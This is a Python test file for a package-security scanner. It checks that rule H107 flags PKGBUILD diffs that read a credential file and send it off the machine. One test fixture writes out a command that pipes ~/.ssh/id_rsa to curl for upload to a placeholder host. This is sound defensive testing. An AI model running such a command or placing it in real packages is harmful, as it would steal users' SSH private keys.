"""H107: a credential read is only interesting when data can leave."""

from trustsight.analysis.adoption import credential_egress_finding


def finding(line: str, *, egress: bool = True):
    findings = [{"rule_id": "H041"}] if egress else []
    diff = f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,4 @@
 pkgname=x
+{line}
+"""
    return credential_egress_finding(
        package_name="demo", findings=findings, diff_text=diff)


def test_h107_fires_on_ssh_key_read_with_upload():
    result = finding("cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://drop.example")
    assert result is not None
    assert result["rule_id"] == "H107"
    assert result["severity"] == "HIGH"


def test_h107_quiet_without_egress():
    assert finding("cat ~/.ssh/id_rsa", egress=False) is None


def test_h107_quiet_on_a_credential_path_without_a_read():
    assert finding("echo '~/.ssh/id_rsa' > notes") is None


def test_h107_quiet_on_a_plain_config_read():
    assert finding("cat .config/app.conf") is None
